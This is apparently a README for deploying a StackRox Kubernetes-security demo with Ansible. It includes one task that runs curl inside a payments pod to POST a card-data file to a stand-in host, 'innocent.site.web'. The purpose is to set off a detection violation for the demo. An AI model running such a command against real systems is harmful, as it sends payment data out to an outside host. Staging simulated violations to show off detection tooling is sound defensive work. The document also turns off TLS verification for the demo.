# Stackrox Demo

## Deploy central

TODO

## Deploy demo

Create secrets.yaml and review it.

```sh
cp ansible/group_vars/all/secrets.yaml.sample ansible/group_vars/all/secrets.yaml
```

Install the pre-requisites.

```sh
ansible-galaxy collection install kubernetes.core
sudo dnf install python3-openshift
```

Patch the existing roles.

```sh
echo -n > ansible/roles/ocp4_workload_stackrox_demo_apps/tasks/pre_workload.yml
echo -n > ansible/roles/ocp4_workload_stackrox_demo_pipeline/tasks/pre_workload.yml
```

Edit `roles/ocp4_workload_stackrox_demo_apps/tasks/deploy_demos.yml` and modify accordingly.

```yaml
- name: k8s_exec violation
  kubernetes.core.k8s_exec:
    namespace: payments
    pod: "{{ r_processor_pod.resources[0].metadata.name }}"
    command: 'curl -X POST --data-binary @/var/lib/processor/card_data http://innocent.site.web'
    ignore_errors: yes
```

Deploy the demo.

```sh
cd ansible
export K8S_AUTH_VERIFY_SSL=false
export K8S_AUTH_KUBECONFIG="$KUBECONFIG"
ansible-playbook install.yaml
```

## With a custom registry

```sh
./mirror.sh
oc apply -f icsp.yaml
podman login registry.itix.xyz
base64 -w0 ${XDG_RUNTIME_DIR}/containers/auth.json > /tmp/auth.b64
echo "ocp4_workload_stackrox_demo_apps_pull_secret: $(cat /tmp/auth.b64)" >> ansible/group_vars/all/secrets.yaml
```
